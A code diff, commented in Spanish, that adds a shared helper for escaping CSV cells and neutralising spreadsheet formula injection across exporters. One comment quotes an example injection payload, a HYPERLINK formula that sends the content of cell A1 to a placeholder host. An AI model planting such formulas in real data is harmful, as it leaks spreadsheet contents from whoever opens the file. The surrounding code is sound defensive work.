@@ -611,6 +611,41 @@ export function validateOutboundUrl(
   return { ok: true };
 }
 
+// ============================================================
+// §10.5 — CSV seguro (una sola implementación para TODOS los exportadores).
+// ============================================================
+
+/**
+ * Celda de CSV: escapa comillas/separadores Y neutraliza las FÓRMULAS.
+ *
+ * Excel y Google Sheets interpretan como fórmula cualquier celda que empiece con
+ * `=`, `+`, `-`, `@`, tabulador o retorno de carro. Y lo que va en estos exports son
+ * nombres, mensajes y notas que escribieron CONTACTOS: gente de fuera. Un contacto
+ * llamado `=HYPERLINK("http://malo/?"&A1,"Haz clic")` se convierte en un enlace vivo —
+ * o algo peor— al abrir el archivo en el computador del dueño. Es "CSV injection".
+ *
+ * La neutralización estándar es prefijar una comilla simple: Excel la muestra como texto
+ * y no evalúa nada. Se prefija ANTES de escapar, y el valor queda entre comillas para que
+ * la propia comilla simple no confunda al lector de CSV.
+ *
+ * Antes había CUATRO copias de este escape (informes, contactos, caja y exports del
+ * worker) y ninguna hacía esto. Vive acá para que agregar un exportador nuevo no sea otra
+ * oportunidad de olvidarlo.
+ */
+export function csvCell(value: unknown): string {
+  const s = value === null || value === undefined ? "" : String(value);
+  if (s === "") return "";
+  // Tab y CR también disparan la interpretación; y un espacio delante no protege.
+  const peligroso = /^[=+\-@\t\r]/.test(s);
+  const base = peligroso ? `'${s}` : s;
+  return peligroso || /[",;\n\r\t]/.test(base) ? `"${base.replace(/"/g, '""')}"` : base;
+}
+
+/** Arma un CSV completo con `csvCell` en cada celda. */
+export function toCsvRows(headers: string[], rows: unknown[][]): string {
+  return [headers.map(csvCell).join(","), ...rows.map((r) => r.map(csvCell).join(","))].join("\n");
+}
+
 export interface CapiJob {
   organizationId: string;
   /** evento origen, p.ej. "lead.status_changed:agenda" o "lead.created" */
